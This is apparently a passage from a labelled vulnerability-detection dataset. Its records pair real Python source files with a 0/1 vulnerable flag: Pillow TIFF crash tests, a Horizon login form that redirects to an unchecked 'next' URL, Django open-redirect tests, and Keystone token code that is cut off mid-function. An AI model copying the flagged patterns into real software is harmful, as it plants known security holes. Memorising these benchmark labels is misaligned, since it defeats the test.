(m[3], m[3])\n    except KeyError:\n        return orig_method_lookup(obj, method_name, dbus_interface)\n\ndbus.service._method_lookup = _dbusmock_method_lookup\n\n\n#\n# Helper API for templates\n#\n\n\ndef get_objects():\n    '''Return all existing object paths'''\n\n    return objects.keys()\n\n\ndef get_object(path):\n    '''Return object for a given object path'''\n\n    return objects[path]\n", "target": 0}
{"idx": 996, "func": "#!/usr/bin/env python\n\n# Reproductions/tests for crashes/read errors in TiffDecode.c\n\n# When run in python, all of these images should fail for\n# one reason or another, either as a buffer overrun,\n# unrecognized datastream, or truncated image file.\n# There shouldn't be any segfaults.\n#\n# if run like\n# `valgrind --tool=memcheck python check_tiff_crashes.py  2>&1 | grep TiffDecode.c`\n# the output should be empty. There may be python issues\n# in the valgrind especially if run in a debug python\n# version.\n\n\nfrom PIL import Image\n\nrepro_read_strip = (\n    \"images/crash_1.tif\",\n    \"images/crash_2.tif\",\n)\n\nfor path in repro_read_strip:\n    with Image.open(path) as im:\n        try:\n            im.load()\n        except Exception as msg:\n            print(msg)\n", "target": 0}
{"idx": 997, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nForms used for Horizon's auth mechanisms.\n\"\"\"\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\nfrom keystoneclient import exceptions as keystone_exceptions\n\nfrom horizon import api\nfrom horizon import base\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef _set_session_data(request, token):\n    request.session['serviceCatalog'] = token.serviceCatalog\n    request.session['tenant'] = token.tenant['name']\n    request.session['tenant_id'] = token.tenant['id']\n    request.session['token'] = token.id\n    request.session['user_name'] = token.user['name']\n    request.session['user_id'] = token.user['id']\n    request.session['roles'] = token.user['roles']\n\n\nclass Login(forms.SelfHandlingForm):\n    \"\"\" Form used for logging in a user.\n\n    Handles authentication with Keystone, choosing a tenant, and fetching\n    a scoped token token for that tenant. Redirects to the URL returned\n    by :meth:`horizon.get_user_home` if successful.\n\n    Subclass of :class:`~horizon.forms.SelfHandlingForm`.\n    \"\"\"\n    region = forms.ChoiceField(label=_(\"Region\"), required=False)\n    username = forms.CharField(label=_(\"User Name\"))\n    password = forms.CharField(label=_(\"Password\"),\n                               widget=forms.PasswordInput(render_value=False))\n\n    def __init__(self, *args, **kwargs):\n        super(Login, self).__init__(*args, **kwargs)\n        # FIXME(gabriel): When we switch to region-only settings, we can\n        # remove this default region business.\n        default_region = (settings.OPENSTACK_KEYSTONE_URL, \"Default Region\")\n        regions = getattr(settings, 'AVAILABLE_REGIONS', [default_region])\n        self.fields['region'].choices = regions\n        if len(regions) == 1:\n            self.fields['region'].initial = default_region[0]\n            self.fields['region'].widget = forms.widgets.HiddenInput()\n\n    def handle(self, request, data):\n        # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n        # form post doesn't include a region.\n        endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n        region_name = dict(self.fields['region'].choices)[endpoint]\n        request.session['region_endpoint'] = endpoint\n        request.session['region_name'] = region_name\n\n        redirect_to = request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n\n        if data.get('tenant', None):\n            try:\n                token = api.token_create(request,\n                                         data.get('tenant'),\n                                         data['username'],\n                                         data['password'])\n                tenants = api.tenant_list_for_token(request, token.id)\n            except:\n                msg = _('Unable to authenticate for that project.')\n                exceptions.handle(request,\n                                  message=msg,\n                                  escalate=True)\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n            redirect = redirect_to or base.Horizon.get_user_home(user)\n            return shortcuts.redirect(redirect)\n\n        elif data.get('username', None):\n            try:\n                unscoped_token = api.token_create(request,\n                                                  '',\n                                                  data['username'],\n                                                  data['password'])\n            except keystone_exceptions.Unauthorized:\n                exceptions.handle(request,\n                                  _('Invalid user name or password.'))\n            except:\n                # If we get here we don't want to show a stack trace to the\n                # user. However, if we fail here, there may be bad session\n                # data that's been cached already.\n                request.session.clear()\n                exceptions.handle(request,\n                                  message=_(\"An error occurred authenticating.\"\n                                            \" Please try again later.\"),\n                                  escalate=True)\n\n            # Unscoped token\n            request.session['unscoped_token'] = unscoped_token.id\n            request.user.username = data['username']\n\n            # Get the tenant list, and log in using first tenant\n            # FIXME (anthony): add tenant chooser here?\n            try:\n                tenants = api.tenant_list_for_token(request, unscoped_token.id)\n            except:\n                exceptions.handle(request)\n                tenants = []\n\n            # Abort if there are no valid tenants for this user\n            if not tenants:\n                messages.error(request,\n                               _('You are not authorized for any projects.') %\n                                {\"user\": data['username']},\n                               extra_tags=\"login\")\n                return\n\n            # Create a token.\n            # NOTE(gabriel): Keystone can return tenants that you're\n            # authorized to administer but not to log into as a user, so in\n            # the case of an Unauthorized error we should iterate through\n            # the tenants until one succeeds or we've failed them all.\n            while tenants:\n                tenant = tenants.pop()\n                try:\n                    token = api.token_create_scoped(request,\n                                                    tenant.id,\n                                                    unscoped_token.id)\n                    break\n                except:\n                    # This will continue for recognized Unauthorized\n                    # exceptions from keystoneclient.\n                    exceptions.handle(request, ignore=True)\n                    token = None\n            if token is None:\n                raise exceptions.NotAuthorized(\n                    _(\"You are not authorized for any available projects.\"))\n\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n        redirect = redirect_to or base.Horizon.get_user_home(user)\n        return shortcuts.redirect(redirect)\n\n\nclass LoginWithTenant(Login):\n    \"\"\"\n    Exactly like :class:`.Login` but includes the tenant id as a field\n    so that the process of choosing a default tenant is bypassed.\n    \"\"\"\n    region = forms.ChoiceField(required=False)\n    username = forms.CharField(max_length=\"20\",\n                       widget=forms.TextInput(attrs={'readonly': 'readonly'}))\n    tenant = forms.CharField(widget=forms.HiddenInput())\n", "target": 1}
{"idx": 998, "func": "import os\nimport re\n\nfrom django.conf import global_settings, settings\nfrom django.contrib.sites.models import Site, RequestSite\nfrom django.contrib.auth.models import User\nfrom django.core import mail\nfrom django.core.urlresolvers import reverse, NoReverseMatch\nfrom django.http import QueryDict\nfrom django.utils.encoding import force_text\nfrom django.utils.html import escape\nfrom django.utils.http import urlquote\nfrom django.test import TestCase\nfrom django.test.utils import override_settings\n\nfrom django.contrib.auth import SESSION_KEY, REDIRECT_FIELD_NAME\nfrom django.contrib.auth.forms import (AuthenticationForm, PasswordChangeForm,\n                SetPasswordForm, PasswordResetForm)\nfrom django.contrib.auth.tests.utils import skipIfCustomUser\n\n\n@override_settings(\n    LANGUAGES=(\n        ('en', 'English'),\n    ),\n    LANGUAGE_CODE='en',\n    TEMPLATE_LOADERS=global_settings.TEMPLATE_LOADERS,\n    TEMPLATE_DIRS=(\n        os.path.join(os.path.dirname(__file__), 'templates'),\n    ),\n    USE_TZ=False,\n    PASSWORD_HASHERS=('django.contrib.auth.hashers.SHA1PasswordHasher',),\n)\nclass AuthViewsTestCase(TestCase):\n    \"\"\"\n    Helper base class for all the follow test cases.\n    \"\"\"\n    fixtures = ['authtestdata.json']\n    urls = 'django.contrib.auth.tests.urls'\n\n    def login(self, password='password'):\n        response = self.client.post('/login/', {\n            'username': 'testclient',\n            'password': password,\n            })\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith(settings.LOGIN_REDIRECT_URL))\n        self.assertTrue(SESSION_KEY in self.client.session)\n\n    def assertContainsEscaped(self, response, text, **kwargs):\n        return self.assertContains(response, escape(force_text(text)), **kwargs)\n\n\n@skipIfCustomUser\nclass AuthViewNamedURLTests(AuthViewsTestCase):\n    urls = 'django.contrib.auth.urls'\n\n    def test_named_urls(self):\n        \"Named URLs should be reversible\"\n        expected_named_urls = [\n            ('login', [], {}),\n            ('logout', [], {}),\n            ('password_change', [], {}),\n            ('password_change_done', [], {}),\n            ('password_reset', [], {}),\n            ('password_reset_done', [], {}),\n            ('password_reset_confirm', [], {\n                'uidb36': 'aaaaaaa',\n                'token': '1111-aaaaa',\n            }),\n            ('password_reset_complete', [], {}),\n        ]\n        for name, args, kwargs in expected_named_urls:\n            try:\n                reverse(name, args=args, kwargs=kwargs)\n            except NoReverseMatch:\n                self.fail(\"Reversal of url named '%s' failed with NoReverseMatch\" % name)\n\n\n@skipIfCustomUser\nclass PasswordResetTest(AuthViewsTestCase):\n\n    def test_email_not_found(self):\n        \"Error is raised if the provided email address isn't currently registered\"\n        response = self.client.get('/password_reset/')\n        self.assertEqual(response.status_code, 200)\n        response = self.client.post('/password_reset/', {'email': 'not_a_real_email@email.com'})\n        self.assertContainsEscaped(response, PasswordResetForm.error_messages['unknown'])\n        self.assertEqual(len(mail.outbox), 0)\n\n    def test_email_found(self):\n        \"Email is sent if a valid email address is provided for password reset\"\n        response = self.client.post('/password_reset/', {'email': 'staffmember@example.com'})\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(len(mail.outbox), 1)\n        self.assertTrue(\"http://\" in mail.outbox[0].body)\n        self.assertEqual(settings.DEFAULT_FROM_EMAIL, mail.outbox[0].from_email)\n\n    def test_email_found_custom_from(self):\n        \"Email is sent if a valid email address is provided for password reset when a custom from_email is provided.\"\n        response = self.client.post('/password_reset_from_email/', {'email': 'staffmember@example.com'})\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(len(mail.outbox), 1)\n        self.assertEqual(\"staffmember@example.com\", mail.outbox[0].from_email)\n\n    def _test_confirm_start(self):\n        # Start by creating the email\n        response = self.client.post('/password_reset/', {'email': 'staffmember@example.com'})\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(len(mail.outbox), 1)\n        return self._read_signup_email(mail.outbox[0])\n\n    def _read_signup_email(self, email):\n        urlmatch = re.search(r\"https?://[^/]*(/.*reset/\\S*)\", email.body)\n        self.assertTrue(urlmatch is not None, \"No URL found in sent email\")\n        return urlmatch.group(), urlmatch.groups()[0]\n\n    def test_confirm_valid(self):\n        url, path = self._test_confirm_start()\n        response = self.client.get(path)\n        # redirect to a 'complete' page:\n        self.assertContains(response, \"Please enter your new password\")\n\n    def test_confirm_invalid(self):\n        url, path = self._test_confirm_start()\n        # Let's munge the token in the path, but keep the same length,\n        # in case the URLconf will reject a different length.\n        path = path[:-5] + (\"0\" * 4) + path[-1]\n\n        response = self.client.get(path)\n        self.assertContains(response, \"The password reset link was invalid\")\n\n    def test_confirm_invalid_user(self):\n        # Ensure that we get a 200 response for a non-existant user, not a 404\n        response = self.client.get('/reset/123456-1-1/')\n        self.assertContains(response, \"The password reset link was invalid\")\n\n    def test_confirm_overflow_user(self):\n        # Ensure that we get a 200 response for a base36 user id that overflows int\n        response = self.client.get('/reset/zzzzzzzzzzzzz-1-1/')\n        self.assertContains(response, \"The password reset link was invalid\")\n\n    def test_confirm_invalid_post(self):\n        # Same as test_confirm_invalid, but trying\n        # to do a POST instead.\n        url, path = self._test_confirm_start()\n        path = path[:-5] + (\"0\" * 4) + path[-1]\n\n        self.client.post(path, {\n            'new_password1': 'anewpassword',\n            'new_password2': ' anewpassword',\n        })\n        # Check the password has not been changed\n        u = User.objects.get(email='staffmember@example.com')\n        self.assertTrue(not u.check_password(\"anewpassword\"))\n\n    def test_confirm_complete(self):\n        url, path = self._test_confirm_start()\n        response = self.client.post(path, {'new_password1': 'anewpassword',\n                                           'new_password2': 'anewpassword'})\n        # It redirects us to a 'complete' page:\n        self.assertEqual(response.status_code, 302)\n        # Check the password has been changed\n        u = User.objects.get(email='staffmember@example.com')\n        self.assertTrue(u.check_password(\"anewpassword\"))\n\n        # Check we can't use the link again\n        response = self.client.get(path)\n        self.assertContains(response, \"The password reset link was invalid\")\n\n    def test_confirm_different_passwords(self):\n        url, path = self._test_confirm_start()\n        response = self.client.post(path, {'new_password1': 'anewpassword',\n                                           'new_password2': 'x'})\n        self.assertContainsEscaped(response, SetPasswordForm.error_messages['password_mismatch'])\n\n\n@override_settings(AUTH_USER_MODEL='auth.CustomUser')\nclass CustomUserPasswordResetTest(AuthViewsTestCase):\n    fixtures = ['custom_user.json']\n\n    def _test_confirm_start(self):\n        # Start by creating the email\n        response = self.client.post('/password_reset/', {'email': 'staffmember@example.com'})\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(len(mail.outbox), 1)\n        return self._read_signup_email(mail.outbox[0])\n\n    def _read_signup_email(self, email):\n        urlmatch = re.search(r\"https?://[^/]*(/.*reset/\\S*)\", email.body)\n        self.assertTrue(urlmatch is not None, \"No URL found in sent email\")\n        return urlmatch.group(), urlmatch.groups()[0]\n\n    def test_confirm_valid_custom_user(self):\n        url, path = self._test_confirm_start()\n        response = self.client.get(path)\n        # redirect to a 'complete' page:\n        self.assertContains(response, \"Please enter your new password\")\n\n\n@skipIfCustomUser\nclass ChangePasswordTest(AuthViewsTestCase):\n\n    def fail_login(self, password='password'):\n        response = self.client.post('/login/', {\n            'username': 'testclient',\n            'password': password,\n        })\n        self.assertContainsEscaped(response, AuthenticationForm.error_messages['invalid_login'])\n\n    def logout(self):\n        response = self.client.get('/logout/')\n\n    def test_password_change_fails_with_invalid_old_password(self):\n        self.login()\n        response = self.client.post('/password_change/', {\n            'old_password': 'donuts',\n            'new_password1': 'password1',\n            'new_password2': 'password1',\n        })\n        self.assertContainsEscaped(response, PasswordChangeForm.error_messages['password_incorrect'])\n\n    def test_password_change_fails_with_mismatched_passwords(self):\n        self.login()\n        response = self.client.post('/password_change/', {\n            'old_password': 'password',\n            'new_password1': 'password1',\n            'new_password2': 'donuts',\n        })\n        self.assertContainsEscaped(response, SetPasswordForm.error_messages['password_mismatch'])\n\n    def test_password_change_succeeds(self):\n        self.login()\n        response = self.client.post('/password_change/', {\n            'old_password': 'password',\n            'new_password1': 'password1',\n            'new_password2': 'password1',\n        })\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/password_change/done/'))\n        self.fail_login()\n        self.login(password='password1')\n\n    def test_password_change_done_succeeds(self):\n        self.login()\n        response = self.client.post('/password_change/', {\n            'old_password': 'password',\n            'new_password1': 'password1',\n            'new_password2': 'password1',\n        })\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/password_change/done/'))\n\n    def test_password_change_done_fails(self):\n        with self.settings(LOGIN_URL='/login/'):\n            response = self.client.get('/password_change/done/')\n            self.assertEqual(response.status_code, 302)\n            self.assertTrue(response['Location'].endswith('/login/?next=/password_change/done/'))\n\n\n@skipIfCustomUser\nclass LoginTest(AuthViewsTestCase):\n\n    def test_current_site_in_context_after_login(self):\n        response = self.client.get(reverse('django.contrib.auth.views.login'))\n        self.assertEqual(response.status_code, 200)\n        if Site._meta.installed:\n            site = Site.objects.get_current()\n            self.assertEqual(response.context['site'], site)\n            self.assertEqual(response.context['site_name'], site.name)\n        else:\n            self.assertIsInstance(response.context['site'], RequestSite)\n        self.assertTrue(isinstance(response.context['form'], AuthenticationForm),\n                     'Login form is not an AuthenticationForm')\n\n    def test_security_check(self, password='password'):\n        login_url = reverse('django.contrib.auth.views.login')\n\n        # Those URLs should not pass the security check\n        for bad_url in ('http://example.com',\n                        'https://example.com',\n                        'ftp://exampel.com',\n                        '//example.com'):\n\n            nasty_url = '%(url)s?%(next)s=%(bad_url)s' % {\n                'url': login_url,\n                'next': REDIRECT_FIELD_NAME,\n                'bad_url': urlquote(bad_url),\n            }\n            response = self.client.post(nasty_url, {\n                'username': 'testclient',\n                'password': password,\n            })\n            self.assertEqual(response.status_code, 302)\n            self.assertFalse(bad_url in response['Location'],\n                             \"%s should be blocked\" % bad_url)\n\n        # These URLs *should* still pass the security check\n        for good_url in ('/view/?param=http://example.com',\n                         '/view/?param=https://example.com',\n                         '/view?param=ftp://exampel.com',\n                         'view/?param=//example.com',\n                         'https:///',\n                         '//testserver/',\n                         '/url%20with%20spaces/'):  # see ticket #12534\n            safe_url = '%(url)s?%(next)s=%(good_url)s' % {\n                'url': login_url,\n                'next': REDIRECT_FIELD_NAME,\n                'good_url': urlquote(good_url),\n            }\n            response = self.client.post(safe_url, {\n                    'username': 'testclient',\n                    'password': password,\n            })\n            self.assertEqual(response.status_code, 302)\n            self.assertTrue(good_url in response['Location'],\n                            \"%s should be allowed\" % good_url)\n\n\n@skipIfCustomUser\nclass LoginURLSettings(AuthViewsTestCase):\n\n    def setUp(self):\n        super(LoginURLSettings, self).setUp()\n        self.old_LOGIN_URL = settings.LOGIN_URL\n\n    def tearDown(self):\n        super(LoginURLSettings, self).tearDown()\n        settings.LOGIN_URL = self.old_LOGIN_URL\n\n    def get_login_required_url(self, login_url):\n        settings.LOGIN_URL = login_url\n        response = self.client.get('/login_required/')\n        self.assertEqual(response.status_code, 302)\n        return response['Location']\n\n    def test_standard_login_url(self):\n        login_url = '/login/'\n        login_required_url = self.get_login_required_url(login_url)\n        querystring = QueryDict('', mutable=True)\n        querystring['next'] = '/login_required/'\n        self.assertEqual(login_required_url, 'http://testserver%s?%s' %\n                         (login_url, querystring.urlencode('/')))\n\n    def test_remote_login_url(self):\n        login_url = 'http://remote.example.com/login'\n        login_required_url = self.get_login_required_url(login_url)\n        querystring = QueryDict('', mutable=True)\n        querystring['next'] = 'http://testserver/login_required/'\n        self.assertEqual(login_required_url,\n                         '%s?%s' % (login_url, querystring.urlencode('/')))\n\n    def test_https_login_url(self):\n        login_url = 'https:///login/'\n        login_required_url = self.get_login_required_url(login_url)\n        querystring = QueryDict('', mutable=True)\n        querystring['next'] = 'http://testserver/login_required/'\n        self.assertEqual(login_required_url,\n                         '%s?%s' % (login_url, querystring.urlencode('/')))\n\n    def test_login_url_with_querystring(self):\n        login_url = '/login/?pretty=1'\n        login_required_url = self.get_login_required_url(login_url)\n        querystring = QueryDict('pretty=1', mutable=True)\n        querystring['next'] = '/login_required/'\n        self.assertEqual(login_required_url, 'http://testserver/login/?%s' %\n                         querystring.urlencode('/'))\n\n    def test_remote_login_url_with_next_querystring(self):\n        login_url = 'http://remote.example.com/login/'\n        login_required_url = self.get_login_required_url('%s?next=/default/' %\n                                                         login_url)\n        querystring = QueryDict('', mutable=True)\n        querystring['next'] = 'http://testserver/login_required/'\n        self.assertEqual(login_required_url, '%s?%s' % (login_url,\n                                                    querystring.urlencode('/')))\n\n\n@skipIfCustomUser\nclass LogoutTest(AuthViewsTestCase):\n\n    def confirm_logged_out(self):\n        self.assertTrue(SESSION_KEY not in self.client.session)\n\n    def test_logout_default(self):\n        \"Logout without next_page option renders the default template\"\n        self.login()\n        response = self.client.get('/logout/')\n        self.assertContains(response, 'Logged out')\n        self.confirm_logged_out()\n\n    def test_14377(self):\n        # Bug 14377\n        self.login()\n        response = self.client.get('/logout/')\n        self.assertTrue('site' in response.context)\n\n    def test_logout_with_overridden_redirect_url(self):\n        # Bug 11223\n        self.login()\n        response = self.client.get('/logout/next_page/')\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/somewhere/'))\n\n        response = self.client.get('/logout/next_page/?next=/login/')\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/login/'))\n\n        self.confirm_logged_out()\n\n    def test_logout_with_next_page_specified(self):\n        \"Logout with next_page option given redirects to specified resource\"\n        self.login()\n        response = self.client.get('/logout/next_page/')\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/somewhere/'))\n        self.confirm_logged_out()\n\n    def test_logout_with_redirect_argument(self):\n        \"Logout with query string redirects to specified resource\"\n        self.login()\n        response = self.client.get('/logout/?next=/login/')\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/login/'))\n        self.confirm_logged_out()\n\n    def test_logout_with_custom_redirect_argument(self):\n        \"Logout with custom query string redirects to specified resource\"\n        self.login()\n        response = self.client.get('/logout/custom_query/?follow=/somewhere/')\n        self.assertEqual(response.status_code, 302)\n        self.assertTrue(response['Location'].endswith('/somewhere/'))\n        self.confirm_logged_out()\n\n    def test_security_check(self, password='password'):\n        logout_url = reverse('django.contrib.auth.views.logout')\n\n        # Those URLs should not pass the security check\n        for bad_url in ('http://example.com',\n                        'https://example.com',\n                        'ftp://exampel.com',\n                        '//example.com'):\n            nasty_url = '%(url)s?%(next)s=%(bad_url)s' % {\n                'url': logout_url,\n                'next': REDIRECT_FIELD_NAME,\n                'bad_url': urlquote(bad_url),\n            }\n            self.login()\n            response = self.client.get(nasty_url)\n            self.assertEqual(response.status_code, 302)\n            self.assertFalse(bad_url in response['Location'],\n                             \"%s should be blocked\" % bad_url)\n            self.confirm_logged_out()\n\n        # These URLs *should* still pass the security check\n        for good_url in ('/view/?param=http://example.com',\n                         '/view/?param=https://example.com',\n                         '/view?param=ftp://exampel.com',\n                         'view/?param=//example.com',\n                         'https:///',\n                         '//testserver/',\n                         '/url%20with%20spaces/'):  # see ticket #12534\n            safe_url = '%(url)s?%(next)s=%(good_url)s' % {\n                'url': logout_url,\n                'next': REDIRECT_FIELD_NAME,\n                'good_url': urlquote(good_url),\n            }\n            self.login()\n            response = self.client.get(safe_url)\n            self.assertEqual(response.status_code, 302)\n            self.assertTrue(good_url in response['Location'],\n                            \"%s should be allowed\" % good_url)\n            self.confirm_logged_out()\n", "target": 1}
{"idx": 999, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 OpenStack LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport uuid\n\nimport routes\n\nfrom keystone import catalog\nfrom keystone import exception\nfrom keystone import identity\nfrom keystone import policy\nfrom keystone import token\nfrom keystone.common import logging\nfrom keystone.common import utils\nfrom keystone.common import wsgi\n\n\nclass AdminRouter(wsgi.ComposingRouter):\n    def __init__(self):\n        mapper = routes.Mapper()\n\n        version_controller = VersionController('admin')\n        mapper.connect('/',\n                       controller=version_controller,\n                       action='get_version')\n\n        # Token Operations\n        auth_controller = TokenController()\n        mapper.connect('/tokens',\n                       controller=auth_controller,\n                       action='authenticate',\n                       conditions=dict(method=['POST']))\n        mapper.connect('/tokens/{token_id}',\n                       controller=auth_controller,\n                       action='validate_token',\n                       conditions=dict(method=['GET']))\n        mapper.connect('/tokens/{token_id}',\n                       controller=auth_controller,\n                       action='validate_token_head',\n                       conditions=dict(method=['HEAD']))\n        mapper.connect('/tokens/{token_id}',\n                       controller=auth_controller,\n                       action='delete_token',\n                       conditions=dict(method=['DELETE']))\n        mapper.connect('/tokens/{token_id}/endpoints',\n                       controller=auth_controller,\n                       action='endpoints',\n                       conditions=dict(method=['GET']))\n\n        # Miscellaneous Operations\n        extensions_controller = AdminExtensionsController()\n        mapper.connect('/extensions',\n                       controller=extensions_controller,\n                       action='get_extensions_info',\n                       conditions=dict(method=['GET']))\n        mapper.connect('/extensions/{extension_alias}',\n                       controller=extensions_controller,\n                       action='get_extension_info',\n                       conditions=dict(method=['GET']))\n        identity_router = identity.AdminRouter()\n        routers = [identity_router]\n        super(AdminRouter, self).__init__(mapper, routers)\n\n\nclass PublicRouter(wsgi.ComposingRouter):\n    def __init__(self):\n        mapper = routes.Mapper()\n\n        version_controller = VersionController('public')\n        mapper.connect('/',\n                       controller=version_controller,\n                       action='get_version')\n\n        # Token Operations\n        auth_controller = TokenController()\n        mapper.connect('/tokens',\n                       controller=auth_controller,\n                       action='authenticate',\n                       conditions=dict(method=['POST']))\n\n        # Miscellaneous\n        extensions_controller = PublicExtensionsController()\n        mapper.connect('/extensions',\n                       controller=extensions_controller,\n                       action='get_extensions_info',\n                       conditions=dict(method=['GET']))\n        mapper.connect('/extensions/{extension_alias}',\n                       controller=extensions_controller,\n                       action='get_extension_info',\n                       conditions=dict(method=['GET']))\n\n        identity_router = identity.PublicRouter()\n        routers = [identity_router]\n\n        super(PublicRouter, self).__init__(mapper, routers)\n\n\nclass PublicVersionRouter(wsgi.ComposingRouter):\n    def __init__(self):\n        mapper = routes.Mapper()\n        version_controller = VersionController('public')\n        mapper.connect('/',\n                       controller=version_controller,\n                       action='get_versions')\n        routers = []\n        super(PublicVersionRouter, self).__init__(mapper, routers)\n\n\nclass AdminVersionRouter(wsgi.ComposingRouter):\n    def __init__(self):\n        mapper = routes.Mapper()\n        version_controller = VersionController('admin')\n        mapper.connect('/',\n                       controller=version_controller,\n                       action='get_versions')\n        routers = []\n        super(AdminVersionRouter, self).__init__(mapper, routers)\n\n\nclass VersionController(wsgi.Application):\n    def __init__(self, version_type):\n        self.catalog_api = catalog.Manager()\n        self.url_key = \"%sURL\" % version_type\n\n        super(VersionController, self).__init__()\n\n    def _get_identity_url(self, context):\n        catalog_ref = self.catalog_api.get_catalog(\n                context=context,\n                user_id=None,\n                tenant_id=None)\n        for region, region_ref in catalog_ref.iteritems():\n            for service, service_ref in region_ref.iteritems():\n                if service == 'identity':\n                    return service_ref[self.url_key]\n\n        raise exception.NotImplemented()\n\n    def _get_versions_list(self, context):\n        \"\"\"The list of versions is dependent on the context.\"\"\"\n        identity_url = self._get_identity_url(context)\n        if not identity_url.endswith('/'):\n            identity_url = identity_url + '/'\n\n        versions = {}\n        versions['v2.0'] = {\n            \"id\": \"v2.0\",\n            \"status\": \"beta\",\n            \"updated\": \"2011-11-19T00:00:00Z\",\n            \"links\": [\n                {\n                    \"rel\": \"self\",\n                    \"href\": identity_url,\n                }, {\n                    \"rel\": \"describedby\",\n                    \"type\": \"text/html\",\n                    \"href\": \"http://docs.openstack.org/api/openstack-\"\n                                \"identity-service/2.0/content/\"\n                }, {\n                    \"rel\": \"describedby\",\n                    \"type\": \"application/pdf\",\n                    \"href\": \"http://docs.openstack.org/api/openstack-\"\n                                \"identity-service/2.0/identity-dev-guide-\"\n                                \"2.0.pdf\"\n                }\n            ],\n            \"media-types\": [\n                {\n                    \"base\": \"application/json\",\n                    \"type\": \"application/vnd.openstack.identity-v2.0\"\n                                \"+json\"\n                }, {\n                    \"base\": \"application/xml\",\n                    \"type\": \"application/vnd.openstack.identity-v2.0\"\n                                \"+xml\"\n                }\n            ]\n        }\n\n        return versions\n\n    def get_versions(self, context):\n        versions = self._get_versions_list(context)\n        return wsgi.render_response(status=(300, 'Multiple Choices'), body={\n            \"versions\": {\n                \"values\": versions.values()\n            }\n        })\n\n    def get_version(self, context):\n        versions = self._get_versions_list(context)\n        return wsgi.render_response(body={\n            \"version\": versions['v2.0']\n        })\n\n\nclass NoopController(wsgi.Application):\n    def __init__(self):\n        super(NoopController, self).__init__()\n\n    def noop(self, context):\n        return {}\n\n\nclass TokenController(wsgi.Application):\n    def __init__(self):\n        self.catalog_api = catalog.Manager()\n        self.identity_api = identity.Manager()\n        self.token_api = token.Manager()\n        self.policy_api = policy.Manager()\n        super(TokenController, self).__init__()\n\n    def authenticate(self, context, auth=None):\n        \"\"\"Authenticate credentials and return a token.\n\n        Accept auth as a dict that looks like::\n\n            {\n                \"auth\":{\n                    \"passwordCredentials\":{\n                        \"username\":\"test_user\",\n                        \"password\":\"mypass\"\n                    },\n                    \"tenantName\":\"customer-x\"\n                }\n            }\n\n        In this case, tenant is optional, if not provided the token will be\n        considered \"unscoped\" and can later be used to get a scoped token.\n\n        Alternatively, this call accepts auth with only a token and tenant\n        that will return a token that is scoped to that tenant.\n        \"\"\"\n\n        token_id = uuid.uuid4().hex\n        if 'passwordCredentials' in auth:\n            username = auth['passwordCredentials'].get('username', '')\n            password = auth['passwordCredentials'].get('password', '')\n            tenant_name = auth.get('tenantName', None)\n\n            user_id = auth['passwordCredentials'].get('userId', None)\n            if username:\n                user_ref = self.identity_api.get_user_by_name(\n                        context=context, user_name=username)\n                if user_ref:\n                    user_id = user_ref['id']\n\n            # more compat\n            tenant_id = auth.get('tenantId', None)\n            if tenant_name:\n                tenant_ref = self.identity_api.get_tenant_by_name(\n                        context=context, tenant_name=tenant_name)\n                if tenant_ref:\n                    tenant_id = tenant_ref['id']\n\n            try:\n                auth_info = self.identity_api.authenticate(context=context,\n                                                           user_id=user_id,\n                                                           password=password,\n                                                           tenant_id=tenant_id)\n                (user_ref, tenant_ref, metadata_ref) = auth_info\n\n                # If the user is disabled don't allow them to authenticate\n                if not user_ref.get('enabled', True):\n                    raise exception.Forbidden(message='User has been disabled')\n            except AssertionError as e:\n                raise exception.Unauthorized(e.message)\n\n            token_ref = self.token_api.create_token(\n                    context, token_id, dict(id=token_id,\n                                            user=user_ref,\n                                            tenant=tenant_ref,\n                                            metadata=metadata_ref))\n            if tenant_ref:\n                catalog_ref = self.catalog_api.get_catalog(\n                        context=context,\n                        user_id=user_ref['id'],\n                        tenant_id=tenant_ref['id'],\n                        metadata=metadata_ref)\n            else:\n                catalog_ref = {}\n\n        elif 'token' in auth:\n            token = auth['token'].get('id', None)\n\n            tenant_name = auth.get('tenantName')\n\n            # more compat\n            if tenant_name:\n                tenant_ref = self.identity_api.get_tenant_by_name(\n                        context=context, tenant_name=tenant_name)\n                tenant_id = 